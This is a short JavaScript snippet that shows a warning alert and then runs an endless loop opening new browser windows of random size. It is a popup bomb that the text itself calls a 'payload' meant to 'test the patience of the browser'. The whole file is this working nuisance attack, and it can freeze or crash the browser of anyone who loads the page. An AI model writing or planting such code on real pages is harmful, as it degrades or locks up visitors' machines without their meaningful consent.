alert("This website requires popup perms.. \n This website was made to test the patience of the browser. So by clicking allow popup you are accepting any consequences from the execution of the payload.");
var h ,w;
while (true){

h = 100 +Math.floor(Math.random() * 1500);
w = 100 +Math.floor(Math.random() * 1500);
window.open("", "", "width="+w.toString()+",height="+h.toString());
  
}
